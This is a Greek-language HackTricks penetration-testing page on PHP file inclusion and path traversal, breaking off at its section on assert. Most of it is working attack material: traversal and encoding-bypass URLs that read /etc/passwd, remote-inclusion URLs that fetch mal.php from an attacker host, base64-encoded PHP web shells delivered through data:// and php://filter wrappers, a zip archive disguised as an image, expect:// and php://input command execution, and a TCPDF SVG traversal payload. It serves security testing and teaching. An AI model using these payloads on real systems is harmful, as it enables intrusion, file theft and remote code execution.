# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Το αρχείο φορτώνεται από απομακρυσμένο server (Καλύτερο: Μπορείς να γράψεις τον κώδικα και ο server θα τον εκτελέσει). Στο php αυτό είναι **απενεργοποιημένο** από προεπιλογή (**allow_url_include**).\
**Local File Inclusion (LFI):** Ο server φορτώνει ένα τοπικό αρχείο.

Η ευπάθεια εμφανίζεται όταν ο χρήστης μπορεί να ελέγξει με κάποιον τρόπο το αρχείο που θα φορτωθεί από τον server.

Ευάλωτες **PHP functions**: require, require_once, include, include_once

Ένα ενδιαφέρον εργαλείο για την εκμετάλλευση αυτής της ευπάθειας: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Συνδυάζοντας διάφορες \*nix LFI λίστες και προσθέτοντας περισσότερες διαδρομές δημιούργησα αυτήν:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Δοκίμασε επίσης να αλλάξεις `/` με `\`\
Δοκίμασε επίσης να προσθέσεις `../../../../../`

Μια λίστα που χρησιμοποιεί διάφορες τεχνικές για να βρει το αρχείο /etc/password (για να ελέγξεις αν υπάρχει η ευπάθεια) μπορεί να βρεθεί [εδώ](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Συγχώνευση διαφορετικών wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Δοκίμασε επίσης να αλλάξεις `/` με `\`\
Δοκίμασε επίσης να αφαιρέσεις `C:/` και να προσθέσεις `../../../../../`

Μια λίστα που χρησιμοποιεί διάφορες τεχνικές για να βρει το αρχείο /boot.ini (για να ελέγξεις αν υπάρχει η ευπάθεια) μπορεί να βρεθεί [εδώ](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Έλεγξε τη λίστα LFI του Linux.

## Βασικά LFI και bypasses

Όλα τα παραδείγματα είναι για Local File Inclusion αλλά μπορούν να εφαρμοστούν και σε Remote File Inclusion (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences αφαιρούνται μη-αναδρομικά
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Παράκαμψη της προσθήκης περισσότερων χαρακτήρων στο τέλος της παρεχόμενης συμβολοσειράς (παράκαμψη του: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Αυτό έχει **επιλυθεί από PHP 5.4**

### **Κωδικοποίηση**

Μπορείτε να χρησιμοποιήσετε μη τυπικές κωδικοποιήσεις όπως double URL encode (και άλλες):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### HTML-to-PDF SVG/IMG path traversal

Οι σύγχρονοι μετατροπείς HTML-to-PDF (π.χ. **TCPDF** ή wrappers όπως **html2pdf**) αναλύουν χωρίς πρόβλημα HTML, SVG, CSS και URL γραμματοσειρών που παρέχονται από επιτιθέμενους, ενώ τρέχουν μέσα σε αξιόπιστα backend δίκτυα με πρόσβαση στο σύστημα αρχείων. Μόλις μπορείτε να εγχύσετε HTML στο `$pdf->writeHTML()`/`Html2Pdf::writeHTML()`, συχνά μπορείτε να κάνετε exfiltrate τοπικά αρχεία που μπορεί να διαβάσει ο λογαριασμός του web server.

- **Fingerprint the renderer**: κάθε παραγόμενο PDF περιέχει ένα πεδίο `Producer` (π.χ. `TCPDF 6.8.2`). Η γνώση του ακριβούς build σας λέει ποιοι path filters υπάρχουν και εάν γίνεται URL decoding πριν την επικύρωση.
- **Inline SVG payloads**: `TCPDF::startSVGElementHandler()` διαβάζει το attribute `xlink:href` από `<image>` elements πριν εκτελέσει `urldecode()`. Η ενσωμάτωση ενός κακόβουλου SVG μέσα σε data URI κάνει πολλούς HTML sanitizers να αγνοούν το payload ενώ η TCPDF εξακολουθεί να το αναλύει:
```
<img src="data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMCAwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxpbWFnZSB4bGluazpocmVmPSIuLi8uLi8uLi8uLi8uLi90bXAvdXNlcl9maWxlcy91c2VyXzEvcHJpdmF0ZV9pbWFnZS5wbmciIGhlaWdodD0iMTAwJSIgd2lkdGg9IjEwMCUiLz48L3N2Zz4=" />
```
TCPDF προθέτει `$_SERVER['DOCUMENT_ROOT']` σε διαδρομές που ξεκινούν με `/` και επιλύει τα `..` μόνο αργότερα, οπότε χρησιμοποιήστε είτε προθέματα `../../..` είτε `/../../..` για να ξεφύγετε από το root μετά την προθήκη.
- **Κωδικοποίηση για παράκαμψη απλοϊκών φίλτρων**: Versions ≤6.8.2 ελέγχουν μόνο για το κυριολεκτικό υποσυμβολοσειρά `../` *πριν* την αποκωδικοποίηση του URL. Αποστολή `..%2f` (ή `..%2F`) στο SVG ή σε ένα raw `<img src>` attribute παρακάμπτει τον έλεγχο, επειδή η ακολουθία dot-dot-slash αναδημιουργείται μόνο αφού το TCPDF καλέσει `urldecode()`.
- **Διπλή κωδικοποίηση για αποκωδικοποίηση πολλαπλών σταδίων**: Αν η είσοδος χρήστη αποκωδικοποιείται από το web framework *και* από το TCPDF, διπλοκωδικοποιήστε την κάθετο (`%252f`). Μία αποκωδικοποίηση τη μετατρέπει σε `%2f`, η δεύτερη αποκωδικοποίηση στο TCPDF τη μετατρέπει σε `/`, παράγοντας `/..%252f..%252f..` → `/../../../…` χωρίς ποτέ να εμφανίζεται `../` στο αρχικό φίλτρο.
- **HTML `<img>` handler**: `TCPDF::openHTMLTagHandler()` περιέχει το ίδιο bug στη σειρά των λειτουργιών, επιτρέποντας άμεσα HTML payloads όπως `src="%2f..%252f..%252ftmp%252fsecret.png"` να διαβάσουν οποιοδήποτε τοπικά προσβάσιμο bitmap.

This technique leaks οτιδήποτε μπορεί να διαβαστεί από τον PDF worker (σαρώσεις διαβατηρίων, API keys απεικονιζόμενα ως εικόνες, κ.λπ.). Hardeners το διόρθωσαν στην 6.9.1 με κανονικοποίηση διαδρομών (`isRelativePath()`), οπότε κατά τις δοκιμές δώστε προτεραιότητα σε παλαιότερες εκδόσεις του `Producer`.

### Από υπάρχον φάκελο

Ίσως το back-end ελέγχει τη διαδρομή του φακέλου:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Εξερεύνηση καταλόγων συστήματος αρχείων σε έναν διακομιστή

Το σύστημα αρχείων ενός διακομιστή μπορεί να εξερευνηθεί αναδρομικά για να εντοπιστούν κατάλογοι, όχι μόνο αρχεία, χρησιμοποιώντας ορισμένες τεχνικές. Αυτή η διαδικασία περιλαμβάνει τον προσδιορισμό του βάθους των καταλόγων και τον έλεγχο για την ύπαρξη συγκεκριμένων φακέλων. Παρακάτω περιγράφεται μια λεπτομερής μέθοδος για να το πετύχετε:

1. **Προσδιορίστε το βάθος των καταλόγων:** Καθορίστε το βάθος του τρέχοντος καταλόγου σας ανακτώντας επιτυχώς το `/etc/passwd` αρχείο (ισχύει αν ο διακομιστής είναι Linux-based). Ένα παράδειγμα URL μπορεί να έχει την εξής δομή, υποδεικνύοντας βάθος τριών:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Έλεγχος για φακέλους:** Προσθέστε το όνομα του υποψιαζόμενου φακέλου (π.χ., `private`) στο URL, στη συνέχεια επιστρέψτε στο `/etc/passwd`. Το επιπλέον επίπεδο καταλόγου απαιτεί την αύξηση του βάθους κατά ένα:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Ερμηνεία των αποτελεσμάτων:** Η απάντηση του διακομιστή δείχνει αν ο φάκελος υπάρχει:
- **Σφάλμα / Καμία έξοδος:** Ο φάκελος `private` μάλλον δεν υπάρχει στην καθορισμένη θέση.
- **Περιεχόμενα του `/etc/passwd`:** Επιβεβαιώνεται η παρουσία του φακέλου `private`.
4. **Αναδρομική διερεύνηση:** Οι εντοπισμένοι φάκελοι μπορούν να διερευνηθούν περαιτέρω για υποκαταλόγους ή αρχεία χρησιμοποιώντας την ίδια τεχνική ή τις παραδοσιακές μεθόδους Local File Inclusion (LFI).

Για διερεύνηση καταλόγων σε διαφορετικές τοποθεσίες στο σύστημα αρχείων, προσαρμόστε το payload ανάλογα. Για παράδειγμα, για να ελέγξετε αν το `/var/www/` περιέχει έναν φάκελο `private` (υποθέτοντας ότι ο τρέχων κατάλογος βρίσκεται σε βάθος 3), χρησιμοποιήστε:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation είναι μια μέθοδος που χρησιμοποιείται για τον χειρισμό διαδρομών αρχείων σε web applications. Συχνά χρησιμοποιείται για την πρόσβαση σε περιορισμένα αρχεία παρακάμπτοντας ορισμένα μέτρα ασφαλείας που προσθέτουν επιπλέον χαρακτήρες στο τέλος των διαδρομών αρχείων. Ο στόχος είναι να δημιουργηθεί μια διαδρομή αρχείου που, αφού τροποποιηθεί από το μέτρο ασφαλείας, εξακολουθεί να δείχνει στο επιθυμητό αρχείο.

Στην PHP, διάφορες αναπαραστάσεις μιας διαδρομής αρχείου μπορούν να θεωρηθούν ισοδύναμες λόγω της φύσης του συστήματος αρχείων. Για παράδειγμα:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, και `/etc/passwd/` αντιμετωπίζονται όλα ως η ίδια διαδρομή.
- Όταν οι τελευταίοι 6 χαρακτήρες είναι `passwd`, η προσθήκη ενός `/` (μετατρέποντάς το σε `passwd/`) δεν αλλάζει το στοχευόμενο αρχείο.
- Ομοίως, εάν το `.php` προστίθεται σε μια διαδρομή αρχείου (π.χ. `shellcode.php`), η προσθήκη ενός `/.` στο τέλος δεν θα αλλάξει το αρχείο που προσπελαύνεται.

Τα παραδείγματα που παρέχονται δείχνουν πώς να χρησιμοποιήσετε το path truncation για πρόσβαση στο `/etc/passwd`, έναν συνηθισμένο στόχο λόγω του ευαίσθητου περιεχομένου του (πληροφορίες λογαριασμών χρηστών):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Σε αυτά τα σενάρια, ο αριθμός των traversals που απαιτούνται μπορεί να είναι περίπου 2027, αλλά αυτός ο αριθμός μπορεί να διαφέρει ανάλογα με τη διαμόρφωση του διακομιστή.

- **Using Dot Segments and Additional Characters**: Οι traversal ακολουθίες (`../`) σε συνδυασμό με επιπλέον dot segments και χαρακτήρες μπορούν να χρησιμοποιηθούν για να πλοηγηθούμε στο σύστημα αρχείων, αγνοώντας στην πράξη τις προστιθέμενες συμβολοσειρές από τον server.
- **Determining the Required Number of Traversals**: Μέσω δοκιμής και σφάλματος, μπορεί κανείς να βρει τον ακριβή αριθμό των `../` αλληλουχιών που χρειάζονται για να φτάσει στον ριζικό κατάλογο και έπειτα στο `/etc/passwd`, διασφαλίζοντας ότι οποιεσδήποτε προστιθέμενες συμβολοσειρές (όπως `.php`) ουδετεροποιούνται αλλά το επιθυμητό μονοπάτι (`/etc/passwd`) παραμένει ανέπαφο.
- **Starting with a Fake Directory**: Είναι κοινή πρακτική να ξεκινάει η διαδρομή με έναν ανύπαρκτο κατάλογο (όπως `a/`). Αυτή η τεχνική χρησιμοποιείται ως προληπτικό μέτρο ή για να ικανοποιήσει τις απαιτήσεις της λογικής ανάλυσης μονοπατιού του διακομιστή.

Όταν χρησιμοποιείτε τεχνικές path truncation, είναι κρίσιμο να κατανοήσετε τη συμπεριφορά ανάλυσης μονοπατιού του διακομιστή και τη δομή του συστήματος αρχείων. Κάθε σενάριο μπορεί να απαιτεί διαφορετική προσέγγιση, και συχνά είναι απαραίτητο να γίνουν δοκιμές για να βρεθεί η πιο αποτελεσματική μέθοδος.

**Αυτή η ευπάθεια διορθώθηκε στο PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

Στο php αυτό είναι απενεργοποιημένο από προεπιλογή επειδή **`allow_url_include`** είναι **Off.** Πρέπει να είναι **On** για να λειτουργήσει, και σε αυτή την περίπτωση μπορείτε να συμπεριλάβετε ένα PHP αρχείο από τον server σας και να αποκτήσετε RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Εάν για κάποιο λόγο **`allow_url_include`** είναι **On**, αλλά το PHP φιλτράρει την πρόσβαση σε εξωτερικές ιστοσελίδες, [according to this post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), μπορείτε για παράδειγμα να χρησιμοποιήσετε το data protocol με base64 για να αποκωδικοποιήσετε έναν b64 PHP κώδικα και να αποκτήσετε RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> Στον προηγούμενο κώδικα, το τελικό `+.txt` προστέθηκε επειδή ο attacker χρειαζόταν μια συμβολοσειρά που τελείωνε σε `.txt`. Έτσι η συμβολοσειρά τελειώνει με αυτό και μετά το b64 decode εκείνο το μέρος θα επιστρέψει απλώς σκουπίδια και ο πραγματικός PHP κώδικας θα συμπεριληφθεί (και συνεπώς θα εκτελεστεί).

Another example **not using the `php://` protocol** would be:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python Root στοιχείο

Σε python, σε κώδικα όπως ο παρακάτω:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Εάν ο χρήστης περάσει μια **απόλυτη διαδρομή** στο **`file_name`**, η **προηγούμενη διαδρομή απλώς αφαιρείται**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Είναι η αναμενόμενη συμπεριφορά σύμφωνα με [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Εάν ένα στοιχείο είναι απόλυτη διαδρομή, όλα τα προηγούμενα στοιχεία αγνοούνται και η σύνθεση συνεχίζεται από το στοιχείο της απόλυτης διαδρομής.

## Java Λίστα καταλόγων

Φαίνεται ότι αν έχεις ένα Path Traversal σε Java και **ζητήσεις έναν κατάλογο** αντί για αρχείο, θα επιστραφεί **λίστα περιεχομένων του καταλόγου**. Αυτό δεν θα συμβαίνει σε άλλες γλώσσες (όσο γνωρίζω).

## Κορυφαίες 25 παράμετροι

Ακολουθεί λίστα με τις κορυφαίες 25 παραμέτρους που θα μπορούσαν να είναι ευάλωτες σε local file inclusion (LFI) vulnerabilities (from [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI χρησιμοποιώντας PHP wrappers & protocols

### php://filter

PHP filters επιτρέπουν την εκτέλεση βασικών **λειτουργιών τροποποίησης στα δεδομένα** πριν αυτά διαβαστούν ή γραφτούν. Υπάρχουν 5 κατηγορίες filters:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Αφαιρεί tags από τα δεδομένα (ό,τι βρίσκεται ανάμεσα στους χαρακτήρες "<" και ">")
- Σημειώστε ότι αυτό το φίλτρο έχει εξαφανιστεί από τις σύγχρονες εκδόσεις του PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Μετατρέπει σε διαφορετική κωδικοποίηση (`convert.iconv.<input_enc>.<output_enc>`). Για να πάρετε τη **λίστα με όλες τις κωδικοποιήσεις** που υποστηρίζονται, τρέξτε στην κονσόλα: `iconv -l`

> [!WARNING]
> Καταχρηστική χρήση του `convert.iconv.*` conversion filter μπορεί να σας επιτρέψει να **παράγετε αυθαίρετο κείμενο**, κάτι που μπορεί να είναι χρήσιμο για να γράψετε αυθαίρετο κείμενο ή να κάνετε μια συνάρτηση όπως include να επεξεργαστεί αυθαίρετο κείμενο. Για περισσότερες πληροφορίες δείτε [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Συμπιέζει το περιεχόμενο (χρήσιμο αν εξάγετε μεγάλη ποσότητα πληροφοριών)
- `zlib.inflate`: Αποσυμπιέζει τα δεδομένα
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Απαρχαιωμένο
- `mdecrypt.*` : Απαρχαιωμένο
- Άλλα φίλτρα
- Τρέχοντας στο php `var_dump(stream_get_filters());` μπορείτε να βρείτε μερικά **απροσδόκητα φίλτρα**:
- `consumed`
- `dechunk`: αναιρεί την HTTP chunked κωδικοποίηση
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Το μέρος "php://filter" δεν κάνει διάκριση πεζών/κεφαλαίων

### Χρήση php filters ως oracle για ανάγνωση αυθαίρετων αρχείων

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) προτείνεται μια τεχνική για να διαβάσετε ένα τοπικό αρχείο χωρίς να επιστραφεί το output από τον server. Η τεχνική βασίζεται σε μια **boolean exfiltration του αρχείου (char by char) χρησιμοποιώντας php filters** ως oracle. Αυτό συμβαίνει επειδή τα php filters μπορούν να χρησιμοποιηθούν για να κάνουν ένα κείμενο αρκετά μεγάλο ώστε το php να πετάξει εξαίρεση.

Στην original post θα βρείτε λεπτομερή εξήγηση της τεχνικής, αλλά εδώ είναι μια γρήγορη περίληψη:

- Use the codec **`UCS-4LE`** για να αφήσει τον leading character του κειμένου στην αρχή και να κάνει το μέγεθος της string να αυξάνεται εκθετικά.
- Αυτό θα χρησιμοποιηθεί για να παραχθεί ένα **text τόσο μεγάλο όταν το αρχικό γράμμα μαντευτεί σωστά** που το php θα πυροδοτήσει ένα **error**
- Το φίλτρο **dechunk** θα **αφαιρέσει τα πάντα αν ο first char δεν είναι hex**, οπότε μπορούμε να ξέρουμε αν ο πρώτος χαρακτήρας είναι hex.
- Αυτό, σε συνδυασμό με το προηγούμενο (και άλλα φίλτρα ανάλογα με το μαντευμένο γράμμα), θα μας επιτρέψει να μαντέψουμε ένα γράμμα στην αρχή του κειμένου βλέποντας πότε, αφού εφαρμόσουμε αρκετές μετατροπές, παύει να είναι hex χαρακτήρας. Επειδή αν είναι hex, το dechunk δεν θα το διαγράψει και η αρχική bomb θα κάνει php error.
- Το codec **convert.iconv.UNICODE.CP930** μετατρέπει κάθε γράμμα στο επόμενο (οπότε μετά από αυτό το codec: a -> b). Αυτό μας επιτρέπει να ανακαλύψουμε αν ο αρχικός χαρακτήρας είναι `a` για παράδειγμα γιατί αν εφαρμόσουμε 6 φορές αυτό το codec a->b->c->d->e->f->g ο χαρακτήρας δεν είναι πια hex, επομένως το dechunk δεν τον διαγράφει και το php error ενεργοποιείται επειδή πολλαπλασιάζεται με την αρχική bomb.
- Χρησιμοποιώντας άλλες μετατροπές όπως **rot13** στην αρχή, είναι δυνατό να leak άλλους χαρακτήρες όπως n, o, p, q, r (και άλλα codecs μπορούν να χρησιμοποιηθούν για να μεταφέρουν άλλα γράμματα στην hex περιοχή).
- Όταν ο αρχικός χαρακτήρας είναι αριθμός χρειάζεται να τον κωδικοποιήσουμε με **base64** και να leak τα 2 πρώτα γράμματα για να leak τον αριθμό.
- Το τελικό πρόβλημα είναι να δούμε **πώς να leak περισσότερα από τον αρχικό χαρακτήρα**. Χρησιμοποιώντας φίλτρα αλλαγής τάξης μνήμης όπως **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** είναι δυνατό να αλλάξουμε τη σειρά των χαρακτήρων και να φέρουμε στην πρώτη θέση άλλα γράμματα του κειμένου.
- Και για να μπορέσουμε να αποκτήσουμε **further data**, η ιδέα είναι να **παράγουμε 2 bytes of junk data στην αρχή** με **convert.iconv.UTF16.UTF16**, να εφαρμόσουμε **UCS-4LE** για να τα κάνουμε **pivot with the next 2 bytes**, και να **delete the data until the junk data** (αυτό θα αφαιρέσει τα πρώτα 2 bytes του αρχικού κειμένου). Συνεχίστε έτσι μέχρι να φτάσετε στο επιθυμητό κομμάτι για να leak.

Στην ανάρτηση δόθηκε επίσης ένα εργαλείο για αυτόματη εκτέλεση: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Αυτό το wrapper επιτρέπει την πρόσβαση σε file descriptors που η διεργασία έχει ανοικτά. Ενδεχομένως χρήσιμο για να exfiltrate το περιεχόμενο ανοιχτών αρχείων:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Μπορείτε επίσης να χρησιμοποιήσετε **php://stdin, php://stdout and php://stderr** για να προσπελάσετε τα **file descriptors 0, 1 and 2** αντίστοιχα (δεν είναι σαφές πώς αυτό θα μπορούσε να είναι χρήσιμο σε μια επίθεση)

### zip:// και rar://

Ανεβάστε ένα αρχείο Zip ή Rar με ένα PHPShell μέσα και αποκτήστε πρόσβαση σε αυτό.\
Για να μπορέσετε να εκμεταλλευτείτε το rar protocol, **πρέπει να ενεργοποιηθεί ειδικά**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Σημειώστε ότι αυτό το πρωτόκολλο περιορίζεται από τις ρυθμίσεις php **`allow_url_open`** και **`allow_url_include`**

### expect://

Το Expect πρέπει να είναι ενεργοποιημένο. Μπορείτε να εκτελέσετε κώδικα χρησιμοποιώντας αυτό:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Καθορίστε το payload σας στις παραμέτρους POST:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Ένα αρχείο `.phar` μπορεί να χρησιμοποιηθεί για την εκτέλεση κώδικα PHP όταν μια εφαρμογή web χρησιμοποιεί συναρτήσεις όπως η `include` για τη φόρτωση αρχείων. Το παρακάτω απόσπασμα κώδικα PHP δείχνει τη δημιουργία ενός αρχείου `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Για να μεταγλωττιστεί το αρχείο `.phar`, πρέπει να εκτελεστεί η ακόλουθη εντολή:
```bash
php --define phar.readonly=0 create_path.php
```
Κατά την εκτέλεση, θα δημιουργηθεί ένα αρχείο με όνομα `test.phar`, το οποίο ενδέχεται να χρησιμοποιηθεί για την εκμετάλλευση ευπαθειών Local File Inclusion (LFI).

Σε περιπτώσεις όπου το LFI απλώς διαβάζει αρχεία χωρίς να εκτελεί τον PHP κώδικα που περιέχουν — μέσω συναρτήσεων όπως `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, ή `filesize()` — μπορεί να επιχειρηθεί εκμετάλλευση μιας deserialization vulnerability. Αυτή η ευπάθεια σχετίζεται με το διάβασμα αρχείων χρησιμοποιώντας το πρωτόκολλο `phar`.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Ήταν δυνατό να καταχραστεί **any arbitrary file read from PHP that supports php filters** για να προκύψει RCE. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Σύντομη περίληψη: ένα **3 byte overflow** στο PHP heap εκμεταλλεύτηκε για να **alter the chain of free chunks** ενός συγκεκριμένου μεγέθους, ώστε να είναι δυνατή η **write anything in any address**, οπότε προστέθηκε ένα hook που καλεί **`system`**.\
Ήταν δυνατό να alloc chunks συγκεκριμένων μεγεθών εκμεταλλευόμενοι επιπλέον php filters.

### More protocols

Δείτε περισσότερα πιθανά[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Εγγραφή στη μνήμη ή σε προσωρινό αρχείο (δεν είμαι σίγουρος/η πώς αυτό μπορεί να είναι χρήσιμο σε ένα file inclusion attack)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Πρόσβαση στο τοπικό filesystem
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Πρόσβαση σε HTTP(s) URLs
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Πρόσβαση σε FTP(s) URLs
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Compression Streams
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Εύρεση μονοπατιών που ταιριάζουν με pattern (Δεν επιστρέφει τίποτα εκτυπώσιμο, οπότε δεν είναι ιδιαίτερα χρήσιμο εδώ)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audio streams (Not useful to read arbitrary files)

## LFI μέσω της 'assert' του PHP

Οι κίνδυνοι Local File Inclusion (LFI) στο PHP είναι ιδιαίτερα υψηλοί όταν χειριζόμαστε τη συνάρτηση 'assert', η οποία μπορεί να εκτελέσει κώδικα μέσα σε strings. Αυτό είναι ιδιαίτερα προβληματικό αν γίνεται έλεγχος εισόδου που περιέχει χαρακτήρες directory traversal όπως ".." αλλά δεν γίνεται σωστή απολύμανση.

Για παράδειγμα, ο κώδικας PHP μπορεί να έχει σχεδιαστεί να αποτρέπει το directory traversal ως εξής:
```bash
assert("strpos('$file', '..') === false") or die("");
```
